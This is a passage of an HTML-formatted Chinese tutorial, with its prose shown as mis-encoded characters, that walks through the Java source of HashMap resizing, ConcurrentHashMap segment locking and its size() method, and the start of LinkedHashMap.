class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">bucketIndex</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">table</span><span class=\"o\">[</span><span class=\"n\">bucketIndex</span><span class=\"o\">];</span>\n    <span class=\"n\">table</span><span class=\"o\">[</span><span class=\"n\">bucketIndex</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Entry</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"n\">e</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">size</span><span class=\"o\">++</span> <span class=\"o\">&gt;=</span> <span class=\"n\">threshold</span><span class=\"o\">)</span>\n        <span class=\"n\">resize</span><span class=\"o\">(</span><span class=\"n\">2</span> <span class=\"o\">*</span> <span class=\"n\">table</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>æ‰©å®¹ä½¿ç”¨ resize() å®ç°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰©å®¹æ“ä½œåŒæ ·éœ€è¦æŠŠ oldTable çš„æ‰€æœ‰é”®å€¼å¯¹é‡æ–°æ’å…¥ newTable ä¸­ï¼Œå› æ­¤è¿™ä¸€æ­¥æ˜¯å¾ˆè´¹æ—¶çš„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">void</span> <span class=\"nf\">resize</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">newCapacity</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Entry</span><span class=\"o\">[]</span> <span class=\"n\">oldTable</span> <span class=\"o\">=</span> <span class=\"n\">table</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">oldCapacity</span> <span class=\"o\">=</span> <span class=\"n\">oldTable</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">oldCapacity</span> <span class=\"o\">==</span> <span class=\"n\">MAXIMUM_CAPACITY</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">threshold</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">MAX_VALUE</span><span class=\"o\">;</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">Entry</span><span class=\"o\">[]</span> <span class=\"n\">newTable</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Entry</span><span class=\"o\">[</span><span class=\"n\">newCapacity</span><span class=\"o\">];</span>\n    <span class=\"n\">transfer</span><span class=\"o\">(</span><span class=\"n\">newTable</span><span class=\"o\">);</span>\n    <span class=\"n\">table</span> <span class=\"o\">=</span> <span class=\"n\">newTable</span><span class=\"o\">;</span>\n    <span class=\"n\">threshold</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">)(</span><span class=\"n\">newCapacity</span> <span class=\"o\">*</span> <span class=\"n\">loadFactor</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">transfer</span><span class=\"o\">(</span><span class=\"n\">Entry</span><span class=\"o\">[]</span> <span class=\"n\">newTable</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Entry</span><span class=\"o\">[]</span> <span class=\"n\">src</span> <span class=\"o\">=</span> <span class=\"n\">table</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">newCapacity</span> <span class=\"o\">=</span> <span class=\"n\">newTable</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">src</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">src</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">e</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">src</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n            <span class=\"k\">do</span> <span class=\"o\">{</span>\n                <span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n                <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">indexFor</span><span class=\"o\">(</span><span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">hash</span><span class=\"o\">,</span> <span class=\"n\">newCapacity</span><span class=\"o\">);</span>\n                <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">newTable</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n                <span class=\"n\">newTable</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">;</span>\n                <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span> <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">e</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h3>6. æ‰©å®¹-é‡æ–°è®¡ç®—æ¡¶ä¸‹æ ‡</h3><p>åœ¨è¿›è¡Œæ‰©å®¹æ—¶ï¼Œéœ€è¦æŠŠé”®å€¼å¯¹é‡æ–°æ”¾åˆ°å¯¹åº”çš„æ¡¶ä¸Šã€‚HashMap ä½¿ç”¨äº†ä¸€ä¸ªç‰¹æ®Šçš„æœºåˆ¶ï¼Œå¯ä»¥é™ä½é‡æ–°è®¡ç®—æ¡¶ä¸‹æ ‡çš„æ“ä½œã€‚</p><p>å‡è®¾åŸæ•°ç»„é•¿åº¦ capacity ä¸º 16ï¼Œæ‰©å®¹ä¹‹å new capacity ä¸º 32ï¼š</p><div class=\"highlight\"><pre><code class=\"language-html\">capacity     : 00010000\nnew capacity : 00100000</code></pre></div><p>å¯¹äºä¸€ä¸ª Keyï¼Œ</p><ul><li>å®ƒçš„å“ˆå¸Œå€¼å¦‚æœåœ¨ç¬¬ 5 ä½ä¸Šä¸º 0ï¼Œé‚£ä¹ˆå–æ¨¡å¾—åˆ°çš„ç»“æœå’Œä¹‹å‰ä¸€æ ·ï¼›</li><li>å¦‚æœä¸º 1ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç»“æœä¸ºåŸæ¥çš„ç»“æœ +16ã€‚</li></ul><h3>7. è®¡ç®—æ•°ç»„å®¹é‡</h3><p>HashMap æ„é€ å‡½æ•°å…è®¸ç”¨æˆ·ä¼ å…¥çš„å®¹é‡ä¸æ˜¯ 2 çš„ n æ¬¡æ–¹ï¼Œå› ä¸ºå®ƒå¯ä»¥è‡ªåŠ¨åœ°å°†ä¼ å…¥çš„å®¹é‡è½¬æ¢ä¸º 2 çš„ n æ¬¡æ–¹ã€‚</p><p>å…ˆè€ƒè™‘å¦‚ä½•æ±‚ä¸€ä¸ªæ•°çš„æ©ç ï¼Œå¯¹äº 10010000ï¼Œå®ƒçš„æ©ç ä¸º 11111111ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å¾—åˆ°ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">mask |= mask &gt;&gt; 1    11011000\nmask |= mask &gt;&gt; 2    11111110\nmask |= mask &gt;&gt; 4    11111111</code></pre></div><p>mask+1 æ˜¯å¤§äºåŸå§‹æ•°å­—çš„æœ€å°çš„ 2 çš„ n æ¬¡æ–¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-text\">num     10010000\nmask+1 100000000</code></pre></div><p>ä»¥ä¸‹æ˜¯ HashMap ä¸­è®¡ç®—æ•°ç»„å®¹é‡çš„ä»£ç ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"nf\">tableSizeFor</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">cap</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">cap</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"n\">n</span> <span class=\"o\">|=</span> <span class=\"n\">n</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"n\">n</span> <span class=\"o\">|=</span> <span class=\"n\">n</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"n\">n</span> <span class=\"o\">|=</span> <span class=\"n\">n</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">4</span><span class=\"o\">;</span>\n    <span class=\"n\">n</span> <span class=\"o\">|=</span> <span class=\"n\">n</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">8</span><span class=\"o\">;</span>\n    <span class=\"n\">n</span> <span class=\"o\">|=</span> <span class=\"n\">n</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">16</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">?</span> <span class=\"n\">1</span> <span class=\"o\">:</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&gt;=</span> <span class=\"n\">MAXIMUM_CAPACITY</span><span class=\"o\">)</span> <span class=\"o\">?</span> <span class=\"n\">MAXIMUM_CAPACITY</span> <span class=\"o\">:</span> <span class=\"n\">n</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>8. é“¾è¡¨è½¬çº¢é»‘æ ‘</h3><p>ä» JDK 1.8 å¼€å§‹ï¼Œä¸€ä¸ªæ¡¶å­˜å‚¨çš„é“¾è¡¨é•¿åº¦å¤§äº 8 æ—¶ä¼šå°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘ã€‚</p><h3>9. ä¸ HashTable çš„æ¯”è¾ƒ</h3><ul><li>HashTable ä½¿ç”¨ synchronized æ¥è¿›è¡ŒåŒæ­¥ã€‚</li><li>HashMap å¯ä»¥æ’å…¥é”®ä¸º null çš„ Entryã€‚</li><li>HashMap çš„è¿­ä»£å™¨æ˜¯ fail-fast è¿­ä»£å™¨ã€‚</li><li>HashMap ä¸èƒ½ä¿è¯éšç€æ—¶é—´çš„æ¨ç§» Map ä¸­çš„å…ƒç´ æ¬¡åºæ˜¯ä¸å˜çš„ã€‚</li></ul><h2>ConcurrentHashMap</h2><h3>1. å­˜å‚¨ç»“æ„</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">HashEntry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">hash</span><span class=\"o\">;</span>\n    <span class=\"kd\">final</span> <span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">;</span>\n    <span class=\"kd\">volatile</span> <span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"kd\">volatile</span> <span class=\"n\">HashEntry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ConcurrentHashMap å’Œ HashMap å®ç°ä¸Šç±»ä¼¼ï¼Œæœ€ä¸»è¦çš„å·®åˆ«æ˜¯ ConcurrentHashMap é‡‡ç”¨äº†åˆ†æ®µé”ï¼ˆSegmentï¼‰ï¼Œæ¯ä¸ªåˆ†æ®µé”ç»´æŠ¤ç€å‡ ä¸ªæ¡¶ï¼ˆHashEntryï¼‰ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è®¿é—®ä¸åŒåˆ†æ®µé”ä¸Šçš„æ¡¶ï¼Œä»è€Œä½¿å…¶å¹¶å‘åº¦æ›´é«˜ï¼ˆå¹¶å‘åº¦å°±æ˜¯ Segment çš„ä¸ªæ•°ï¼‰ã€‚</p><p>Segment ç»§æ‰¿è‡ª ReentrantLockã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">Segment</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">extends</span> <span class=\"n\">ReentrantLock</span> <span class=\"kd\">implements</span> <span class=\"n\">Serializable</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">long</span> <span class=\"n\">serialVersionUID</span> <span class=\"o\">=</span> <span class=\"n\">2249069246763182397L</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">MAX_SCAN_RETRIES</span> <span class=\"o\">=</span>\n        <span class=\"n\">Runtime</span><span class=\"o\">.</span><span class=\"na\">getRuntime</span><span class=\"o\">().</span><span class=\"na\">availableProcessors</span><span class=\"o\">()</span> <span class=\"o\">&gt;</span> <span class=\"n\">1</span> <span class=\"o\">?</span> <span class=\"n\">64</span> <span class=\"o\">:</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">transient</span> <span class=\"kd\">volatile</span> <span class=\"n\">HashEntry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;[]</span> <span class=\"n\">table</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">transient</span> <span class=\"kt\">int</span> <span class=\"n\">count</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">transient</span> <span class=\"kt\">int</span> <span class=\"n\">modCount</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">transient</span> <span class=\"kt\">int</span> <span class=\"n\">threshold</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">final</span> <span class=\"kt\">float</span> <span class=\"n\">loadFactor</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">final</span> <span class=\"n\">Segment</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;[]</span> <span class=\"n\">segments</span><span class=\"o\">;</span></code></pre></div><p>é»˜è®¤çš„å¹¶å‘çº§åˆ«ä¸º 16ï¼Œä¹Ÿå°±æ˜¯è¯´é»˜è®¤åˆ›å»º 16 ä¸ª Segmentã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">DEFAULT_CONCURRENCY_LEVEL</span> <span class=\"o\">=</span> <span class=\"n\">16</span><span class=\"o\">;</span></code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d39174ecc7c6cc862bc9ff177d26f91_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"994\" data-rawheight=\"608\" class=\"origin_image zh-lightbox-thumb\" width=\"994\" data-original=\"https://pic2.zhimg.com/v2-4d39174ecc7c6cc862bc9ff177d26f91_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;994&#39; height=&#39;608&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"994\" data-rawheight=\"608\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"994\" data-original=\"https://pic2.zhimg.com/v2-4d39174ecc7c6cc862bc9ff177d26f91_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d39174ecc7c6cc862bc9ff177d26f91_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. size æ“ä½œ</h3><p>æ¯ä¸ª Segment ç»´æŠ¤äº†ä¸€ä¸ª count å˜é‡æ¥ç»Ÿè®¡è¯¥ Segment ä¸­çš„é”®å€¼å¯¹ä¸ªæ•°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"cm\">/**\n</span><span class=\"cm\"> * The number of elements. Accessed only either within locks\n</span><span class=\"cm\"> * or among other volatile reads that maintain visibility.\n</span><span class=\"cm\"> */</span>\n<span class=\"kd\">transient</span> <span class=\"kt\">int</span> <span class=\"n\">count</span><span class=\"o\">;</span></code></pre></div><p>åœ¨æ‰§è¡Œ size æ“ä½œæ—¶ï¼Œéœ€è¦éå†æ‰€æœ‰ Segment ç„¶åæŠŠ count ç´¯è®¡èµ·æ¥ã€‚</p><p>ConcurrentHashMap åœ¨æ‰§è¡Œ size æ“ä½œæ—¶å…ˆå°è¯•ä¸åŠ é”ï¼Œå¦‚æœè¿ç»­ä¸¤æ¬¡ä¸åŠ é”æ“ä½œå¾—åˆ°çš„ç»“æœä¸€è‡´ï¼Œé‚£ä¹ˆå¯ä»¥è®¤ä¸ºè¿™ä¸ªç»“æœæ˜¯æ­£ç¡®çš„ã€‚</p><p>å°è¯•æ¬¡æ•°ä½¿ç”¨ RETRIES_BEFORE_LOCK å®šä¹‰ï¼Œè¯¥å€¼ä¸º 2ï¼Œretries åˆå§‹å€¼ä¸º -1ï¼Œå› æ­¤å°è¯•æ¬¡æ•°ä¸º 3ã€‚</p><p>å¦‚æœå°è¯•çš„æ¬¡æ•°è¶…è¿‡ 3 æ¬¡ï¼Œå°±éœ€è¦å¯¹æ¯ä¸ª Segment åŠ é”ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"cm\">/**\n</span><span class=\"cm\"> * Number of unsynchronized retries in size and containsValue\n</span><span class=\"cm\"> * methods before resorting to locking. This is used to avoid\n</span><span class=\"cm\"> * unbounded retries if tables undergo continuous modification\n</span><span class=\"cm\"> * which would make it impossible to obtain an accurate result.\n</span><span class=\"cm\"> */</span>\n<span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">RETRIES_BEFORE_LOCK</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">size</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// Try a few times to get accurate count. On failure due to\n</span><span class=\"c1\"></span>    <span class=\"c1\">// continuous async changes in table, resort to locking.\n</span><span class=\"c1\"></span>    <span class=\"kd\">final</span> <span class=\"n\">Segment</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;[]</span> <span class=\"n\">segments</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">segments</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"o\">;</span>\n    <span class=\"kt\">boolean</span> <span class=\"n\">overflow</span><span class=\"o\">;</span> <span class=\"c1\">// true if size overflows 32 bits\n</span><span class=\"c1\"></span>    <span class=\"kt\">long</span> <span class=\"n\">sum</span><span class=\"o\">;</span>         <span class=\"c1\">// sum of modCounts\n</span><span class=\"c1\"></span>    <span class=\"kt\">long</span> <span class=\"n\">last</span> <span class=\"o\">=</span> <span class=\"n\">0L</span><span class=\"o\">;</span>   <span class=\"c1\">// previous sum\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">retries</span> <span class=\"o\">=</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"c1\">// first iteration isn&#39;t retry\n</span><span class=\"c1\"></span>    <span class=\"k\">try</span> <span class=\"o\">{</span>\n        <span class=\"k\">for</span> <span class=\"o\">(;;)</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// è¶…è¿‡å°è¯•æ¬¡æ•°ï¼Œåˆ™å¯¹æ¯ä¸ª Segment åŠ é”\n</span><span class=\"c1\"></span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">retries</span><span class=\"o\">++</span> <span class=\"o\">==</span> <span class=\"n\">RETRIES_BEFORE_LOCK</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">segments</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"o\">++</span><span class=\"n\">j</span><span class=\"o\">)</span>\n                    <span class=\"n\">ensureSegment</span><span class=\"o\">(</span><span class=\"n\">j</span><span class=\"o\">).</span><span class=\"na\">lock</span><span class=\"o\">();</span> <span class=\"c1\">// force creation\n</span><span class=\"c1\"></span>            <span class=\"o\">}</span>\n            <span class=\"n\">sum</span> <span class=\"o\">=</span> <span class=\"n\">0L</span><span class=\"o\">;</span>\n            <span class=\"n\">size</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n            <span class=\"n\">overflow</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">segments</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"o\">++</span><span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">Segment</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">seg</span> <span class=\"o\">=</span> <span class=\"n\">segmentAt</span><span class=\"o\">(</span><span class=\"n\">segments</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">);</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">seg</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"n\">sum</span> <span class=\"o\">+=</span> <span class=\"n\">seg</span><span class=\"o\">.</span><span class=\"na\">modCount</span><span class=\"o\">;</span>\n                    <span class=\"kt\">int</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">seg</span><span class=\"o\">.</span><span class=\"na\">count</span><span class=\"o\">;</span>\n                    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">c</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"n\">size</span> <span class=\"o\">+=</span> <span class=\"n\">c</span><span class=\"o\">)</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n                        <span class=\"n\">overflow</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n                <span class=\"o\">}</span>\n            <span class=\"o\">}</span>\n            <span class=\"c1\">// è¿ç»­ä¸¤æ¬¡å¾—åˆ°çš„ç»“æœä¸€è‡´ï¼Œåˆ™è®¤ä¸ºè¿™ä¸ªç»“æœæ˜¯æ­£ç¡®çš„\n</span><span class=\"c1\"></span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">sum</span> <span class=\"o\">==</span> <span class=\"n\">last</span><span class=\"o\">)</span>\n                <span class=\"k\">break</span><span class=\"o\">;</span>\n            <span class=\"n\">last</span> <span class=\"o\">=</span> <span class=\"n\">sum</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span> <span class=\"k\">finally</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">retries</span> <span class=\"o\">&gt;</span> <span class=\"n\">RETRIES_BEFORE_LOCK</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">segments</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"o\">++</span><span class=\"n\">j</span><span class=\"o\">)</span>\n                <span class=\"n\">segmentAt</span><span class=\"o\">(</span><span class=\"n\">segments</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">).</span><span class=\"na\">unlock</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">overflow</span> <span class=\"o\">?</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">MAX_VALUE</span> <span class=\"o\">:</span> <span class=\"n\">size</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>3. JDK 1.8 çš„æ”¹åŠ¨</h3><p>JDK 1.7 ä½¿ç”¨åˆ†æ®µé”æœºåˆ¶æ¥å®ç°å¹¶å‘æ›´æ–°æ“ä½œï¼Œæ ¸å¿ƒç±»ä¸º Segmentï¼Œå®ƒç»§æ‰¿è‡ªé‡å…¥é” ReentrantLockï¼Œå¹¶å‘åº¦ä¸ Segment æ•°é‡ç›¸ç­‰ã€‚</p><p>JDK 1.8 ä½¿ç”¨äº† CAS æ“ä½œæ¥æ”¯æŒæ›´é«˜çš„å¹¶å‘åº¦ï¼Œåœ¨ CAS æ“ä½œå¤±è´¥æ—¶ä½¿ç”¨å†…ç½®é” synchronizedã€‚</p><p>å¹¶ä¸” JDK 1.8 çš„å®ç°ä¹Ÿåœ¨é“¾è¡¨è¿‡é•¿æ—¶ä¼šè½¬æ¢ä¸ºçº¢é»‘æ ‘ã€‚</p><h2>LinkedHashMap</h2><h3>å­˜å‚¨ç»“æ„</h3><p>ç»§æ‰¿è‡ª HashMapï¼Œå› æ­¤å…·æœ‰å’Œ HashMap ä¸€æ ·çš„å¿«é€ŸæŸ¥æ‰¾ç‰¹æ€§ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">LinkedHashMap</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">extends</span> <span class=\"n\">HashMap</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">implements</span> <span class=\"n\">Map</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span></code></pre></div><p>å†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œç”¨æ¥ç»´æŠ¤æ’å…¥é¡ºåºæˆ–è€… LRU é¡ºåºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"cm\">/**\n</span><span class=\"cm\"> * The head (eldest) of the doubly linked list.\n</span><span class=\"cm\"> */</span>\n<span class=\"kd\">transient</span> <span class=\"n\">LinkedHashMap</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n\n<span 